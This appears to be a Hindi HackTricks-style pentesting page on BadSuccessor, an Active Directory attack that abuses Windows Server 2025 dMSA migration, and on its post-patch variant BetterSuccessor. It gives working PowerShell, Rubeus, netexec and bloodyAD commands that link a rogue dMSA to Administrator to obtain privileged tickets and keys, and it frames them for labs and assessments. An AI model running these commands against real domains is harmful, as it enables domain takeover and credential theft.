# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

**BadSuccessor**, **Windows Server 2025** में शुरू किए गए **delegated Managed Service Account** (**dMSA**) migration workflow का दुरुपयोग करता है। dMSA को **`msDS-ManagedAccountPrecededByLink`** के ज़रिए किसी legacy account से लिंक किया जा सकता है और **`msDS-DelegatedMSAState`** में संग्रहीत migration states के माध्यम से आगे बढ़ाया जा सकता है। अगर कोई attacker किसी writable OU में dMSA बना सकता है और उन attributes को नियंत्रित कर सकता है, तो KDC, attacker के नियंत्रण वाले dMSA के लिए **लिंक किए गए account के authorization context** के साथ tickets जारी कर सकता है।<sup>[[2]](#references)</sup>

व्यवहार में, इसका अर्थ है कि केवल delegated OU rights रखने वाला कम privilege वाला user एक नया dMSA बना सकता है, उसे `Administrator` से लिंक कर सकता है, migration state पूरी कर सकता है और फिर ऐसा TGT प्राप्त कर सकता है जिसके PAC में **Domain Admins** जैसे privileged groups शामिल हों।<sup>[[2]](#references)</sup>

## dMSA migration की ज़रूरी जानकारी

- dMSA, **Windows Server 2025** का feature है।
- `Start-ADServiceAccountMigration` migration को **started** state में सेट करता है।
- `Complete-ADServiceAccountMigration` migration को **completed** state में सेट करता है।
- `msDS-DelegatedMSAState = 1` का अर्थ है कि migration शुरू हो गया है।
- `msDS-DelegatedMSAState = 2` का अर्थ है कि migration पूरा हो गया है।
- सामान्य migration के दौरान, dMSA को superseded account की जगह पारदर्शी रूप से लेना होता है, इसलिए KDC/LSA उस access को बनाए रखते हैं जो पिछले account के पास पहले से था।<sup>[[3]](#references)</sup>

Microsoft Learn यह भी बताता है कि migration के दौरान मूल account को dMSA से जोड़ा जाता है और dMSA को वही access देना होता है जो पुराने account के पास था।<sup>[[3]](#references)</sup> यही security assumption है जिसका BadSuccessor दुरुपयोग करता है।<sup>[[2]](#references)</sup>

## आवश्यकताएँ

1. ऐसा domain जहाँ **dMSA उपलब्ध हो**, यानी AD side पर **Windows Server 2025** का support मौजूद हो।
2. Attacker किसी OU में `msDS-DelegatedManagedServiceAccount` objects **बना** सकता हो, या वहाँ child objects बनाने के समान व्यापक अधिकार रखता हो।
3. Attacker संबंधित dMSA attributes **लिख** सकता हो या अपने बनाए dMSA को पूरी तरह नियंत्रित कर सकता हो।
4. Attacker domain-joined context से या LDAP/Kerberos तक पहुँचने वाली tunnel के ज़रिए Kerberos tickets माँग सकता हो।<sup>[[2]](#references)</sup>

### व्यावहारिक जाँच

सबसे स्पष्ट operator signal यह जाँचना है कि domain/forest level क्या है और यह पुष्टि करना कि environment पहले से नए Server 2025 stack का उपयोग कर रहा है:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

यदि आपको `Windows2025Domain` और `Windows2025Forest` जैसे मान दिखें, तो **BadSuccessor / dMSA migration abuse** को प्राथमिकता से जाँचें।

आप public tooling से dMSA बनाने के लिए delegated writable OUs की गणना भी कर सकते हैं:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## दुरुपयोग प्रवाह

1. ऐसे OU में dMSA बनाएँ जहाँ आपको child बनाने के delegated अधिकार हों।
2. **`msDS-ManagedAccountPrecededByLink`** को किसी privileged target के DN पर सेट करें, जैसे `CN=Administrator,CN=Users,DC=corp,DC=local`।
3. migration को पूरा चिह्नित करने के लिए **`msDS-DelegatedMSAState`** को `2` पर सेट करें।
4. नए dMSA के लिए TGT माँगें और privileged services तक पहुँचने के लिए मिले ticket का उपयोग करें।<sup>[[2]](#references)</sup>

PowerShell उदाहरण:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Ticket अनुरोध / operational tooling के उदाहरण:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## यह privilege escalation से कहीं अधिक क्यों है

वैध migration के दौरान, Windows को नए dMSA से उन tickets को भी संभालने की ज़रूरत होती है जो cutover से पहले पुराने account के लिए जारी किए गए थे। यही वजह है कि dMSA-संबंधित ticket material में **`KERB-DMSA-KEY-PACKAGE`** flow में **current** और **previous** keys शामिल हो सकती हैं।<sup>[[2]](#references)</sup>

हमलावर द्वारा नियंत्रित fake migration में, यह व्यवहार BadSuccessor को इन रूपों में बदल सकता है:<sup>[[2]](#references)</sup>

- PAC में privileged group SIDs विरासत में लेकर **Privilege escalation**।
- **Credential material exposure**, क्योंकि previous-key handling से vulnerable workflows में predecessor के RC4/NT hash के बराबर material उजागर हो सकता है।

इससे यह technique सीधे domain takeover और pass-the-hash या बड़े पैमाने पर credential compromise जैसे आगे के operations—दोनों के लिए उपयोगी बनती है।

## KDC patch के बाद BetterSuccessor

Patched KDC dMSA migration के दोनों पक्षों की जाँच करता है। dMSA के `msDS-ManagedAccountPrecededByLink` और migration state के अलावा, predecessor को `msDS-SupersededManagedAccountLink` के ज़रिए dMSA की ओर वापस point करना होगा और उसका `msDS-SupersededServiceAccountState` संगत होना चाहिए। अब one-way link विफल हो जाता है; केवल dMSA बना सकने वाला account किसी भी मनचाहे predecessor को नामित नहीं कर सकता। dMSA के लिए किसी OU में `CreateChild` **और** चुने गए target account के migration attributes पर प्रभावी write access होने पर, attacker reciprocal link स्थापित कर सकता है। इससे बने dMSA ticket में predecessor का authorization context हो सकता है और dMSA key package में उसकी keys उजागर हो सकती हैं। यह targeted credential-access/privilege-amplification का रास्ता है, इस बात का प्रमाण नहीं कि patched DCs पर मूल arbitrary-target BadSuccessor अब भी exploitable है।<sup>[[5]](#references)[[6]](#references)</sup>

ऐसी lab में जहाँ target-account write की पुष्टि हो चुकी हो, `bloodyAD` dMSA बना सकता है और migration के दोनों तरफ़ के writes कर सकता है। लौटाए गए Kerberos material का इस्तेमाल करके dMSA ticket माँगें और यह मानने से पहले कि उसके privileges या hash प्राप्त हो गए हैं, target account की वास्तविक permissions जाँचें। Tool के `badSuccessor` subcommand का नाम unpatched one-way behavior का संकेत नहीं देता।<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## पैच स्थिति पर नोट्स

मूल BadSuccessor व्यवहार **सिर्फ 2025 का कोई सैद्धांतिक preview मुद्दा नहीं है**। Microsoft ने इसे **CVE-2025-53779** सौंपा और **अगस्त 2025** में security update प्रकाशित किया।<sup>[[4]](#references)</sup> इस attack को इन स्थितियों के लिए documented रखें:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **assessments के दौरान OU delegations और dMSA exposure का validation**

सिर्फ dMSA मौजूद होने के कारण यह न मानें कि Windows Server 2025 domain vulnerable है; patch level verify करें और सावधानी से test करें।

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA के दुरुपयोग से Domain Admin तक (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Active Directory में Privileges बढ़ाने के लिए dMSA का दुरुपयोग](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts का अवलोकन](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor अब नहीं रहा, BadSuccessor अमर रहे(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: पैच के बाद भी dMSA का दुरुपयोग](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
